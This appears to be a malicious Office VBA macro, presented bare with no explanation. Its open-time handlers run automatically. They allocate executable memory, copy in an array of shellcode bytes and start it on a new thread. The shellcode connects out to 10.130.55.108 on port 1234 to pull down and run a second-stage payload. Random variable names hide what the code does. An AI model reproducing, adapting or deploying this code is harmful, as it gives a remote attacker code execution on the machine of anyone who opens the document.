#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Sipolzy As Long, ByVal Gfpxz As Long, ByVal Lcduimqm As LongPtr, Wdesgui As Long, ByVal Ocjjc As Long, Fyh As Long) As LongPtr
	Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Nwv As Long, ByVal Motvwsqq As Long, ByVal Bam As Long, ByVal Yxbjpg As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Nmnesthx As LongPtr, ByRef Ogifkn As Any, ByVal Qnpnh As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal Sipolzy As Long, ByVal Gfpxz As Long, ByVal Lcduimqm As Long, Wdesgui As Long, ByVal Ocjjc As Long, Fyh As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Nwv As Long, ByVal Motvwsqq As Long, ByVal Bam As Long, ByVal Yxbjpg As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Nmnesthx As Long, ByRef Ogifkn As Any, ByVal Qnpnh As Long) As Long
#EndIf

Sub Auto_Open()
	Dim Tannnp As Long, Xrpjyq As Variant, Sfkrnwhte As Long
#If Vba7 Then
	Dim  Nwiqlo As LongPtr, Jfay As LongPtr
#Else
	Dim  Nwiqlo As Long, Jfay As Long
#EndIf
	Xrpjyq = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20, _
139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1, _
199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81, _
139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36, _
1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36, _
91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,104,51,50,0, _
0,104,119,115,50,95,84,104,76,119,38,7,255,213,184,144,1,0,0,41, _
196,84,80,104,41,128,107,0,255,213,106,5,104,10,130,55,108,104,2,0, _
4,210,137,230,80,80,80,80,64,80,64,80,104,234,15,223,224,255,213,151, _
106,16,86,87,104,153,165,116,97,255,213,133,192,116,10,255,78,8,117,236, _
232,97,0,0,0,106,0,106,4,86,87,104,2,217,200,95,255,213,131,248, _
0,126,54,139,54,106,64,104,0,16,0,0,86,106,0,104,88,164,83,229, _
255,213,147,83,106,0,86,83,87,104,2,217,200,95,255,213,131,248,0,125, _
34,88,104,0,64,0,0,106,0,80,104,11,47,15,48,255,213,87,104,117, _
110,77,97,255,213,94,94,255,12,36,233,113,255,255,255,1,195,41,198,117, _
199,195,187,240,181,162,86,106,0,83,255,213)

	Nwiqlo = VirtualAlloc(0, UBound(Xrpjyq), &H1000, &H40)
	For Sfkrnwhte = LBound(Xrpjyq) To UBound(Xrpjyq)
		Tannnp = Xrpjyq(Sfkrnwhte)
		Jfay = RtlMoveMemory(Nwiqlo + Sfkrnwhte, Tannnp, 1)
	Next Sfkrnwhte
	Jfay = CreateThread(0, 0, Nwiqlo, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Workbook_Open()
	Auto_Open
End Sub

